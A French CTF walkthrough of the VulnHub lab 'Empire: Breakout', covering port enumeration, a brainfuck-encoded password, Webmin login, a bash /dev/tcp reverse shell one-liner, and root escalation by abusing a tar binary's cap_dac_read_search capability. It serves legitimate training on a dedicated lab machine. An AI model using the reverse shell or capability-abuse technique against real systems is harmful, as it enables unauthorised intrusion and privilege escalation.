---
title: "CTF Empire: Breakout"
date: 2021-11-20
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/empire-breakout,751
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.3** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.21`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir EmpireBreakout && cd EmpireBreakout`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
```

On a un serveur **Apache** 2.4.51 sur le port **80**, un serveur **Samba** 4.6.2 sur les port **139** et **445** et 2 deux serveurs **Webmin** (de 2 versions différentes) sur les ports **10000** et **20000**.

Sur la page d'accueil du serveur **Apache**, on a indice en bas du code source de la page HTML.

```txt
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

-->
```

C'est le fameux langage **brainfuck** qui retourne une sorte de mot de passe ".2uqPEfj3D<P'a-3".

Ensuite, on énumère le serveur **Samba** à la recherche d'un utilisateur avec l'outil **enum4linux**.

```bash
enum4linux -a $IP

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cyber (Local User)
```

On a un utilisateur potentiel, "cyber".

Puis, on poursuit avec les 2 serveurs **Webmin** qui nous indiquent le host à utiliser.

```bash
sudo vim /etc/hosts
192.168.1.21    breakout.home
```

La connexion avec `cyber:.2uqPEfj3D<P'a-3` ne fonctionne pas sur le premier serveur avec le port **10000** mais sur le second avec le **20000**.

## Pénétration

Dans le menu de gauche, il y a une petite icone qui symbolise une commande shell. On va ouvrir un reverse shell pour être plus à l'aise. Dans un nouvel onglet de votre terminal, instanciez le serveur **Netcat** `nc -lanp 1234`. Puis dans le shell de Webmin, `bash -c 'bash -i >& /dev/tcp/192.168.1.33/1234 0>&1'`

On trouve le premier flag dans le répertoire de l'utilisateur "cyber".

```bash
$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

## Escalation

Dans le même répertoire, il y a un exécutable "tar", plus précisément un ELF (Executable and Linkable Format).

```bash
$ ls -la
-rwxr-xr-x  1 root  root  531928 Oct 19 15:40 tar
$ file tar
tar: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=727740cc46ed2e44f47dfff7bad5dc3fdb1249cb, for GNU/Linux 3.2.0, stripped
```

On affiche les *capabilities* (capacités) de cet exécutable avec la commande **getcap**.

```bash
$ getcap tar
tar cap_dac_read_search=ep
```

Cette [option](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-with-binary-3) signifie que le binaire sera capable de lire n'importe quel fichier. Cela tombe à pic car dans le dossier "/var/backups", on a un fichier que l'on voudrait pouvoir lire ".old_pass.bak" car on n'a pas les droits de lecture.

```bash
$ ./tar -cf back.tar /var/backups/.old_pass.bak
$ tar -xf back.tar
$ ls
back.tar  tar  user.txt  var
```

Le dossier "var" a été créé et on peut lire son contenu.

```bash
$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```

Comme convenu, il contient un mot de passe, ce qui nous permet de nous connecter en tant qu'utilisateur "root".

```bash
$ su root
Password: Ts&4&YurgtRX(=~h
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Et on trouve rapidement le second et dernier flag.

```bash
$ cd ~
$ cat rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```
